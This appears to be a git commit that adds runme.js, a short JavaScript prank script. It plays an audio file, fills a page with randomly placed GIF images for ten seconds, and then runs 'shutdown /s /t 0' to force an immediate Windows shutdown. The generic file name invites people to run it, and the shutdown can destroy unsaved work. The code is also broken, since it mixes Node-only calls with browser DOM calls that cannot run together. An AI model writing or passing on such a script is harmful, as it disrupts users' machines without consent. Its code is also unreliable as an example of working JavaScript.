1e88ce0ac19821539736267ded481eac82993838
Destroyer101234 <153321083+Destroyer101234@users.noreply.github.com>
2024-09-27 13:19:38 -0400

    Create runme.js

---
+++ runme.js
@@ -0,0 +1,31 @@
+const { exec } = require('child_process');
+const player = require('play-sound')(opts = {});
+
+function playMp3AndSpamGif() {
+    player.play('path/to/your/audio.mp3', (err) => {
+        if (err) throw err;
+    });
+
+    const gifUrl = 'path/to/your/gif.gif';
+    const spamInterval = setInterval(() => {
+        const img = document.createElement('img');
+        img.src = gifUrl;
+        img.style.position = 'absolute';
+        img.style.top = Math.random() * window.innerHeight + 'px';
+        img.style.left = Math.random() * window.innerWidth + 'px';
+        document.body.appendChild(img);
+    }, 100);
+
+    setTimeout(() => {
+        clearInterval(spamInterval);
+        shutdownComputer();
+    }, 10000); // Spams for 10 seconds
+}
+
+function shutdownComputer() {
+    exec('shutdown /s /t 0', (err) => {
+        if (err) throw err;
+    });
+}
+
+playMp3AndSpamGif();
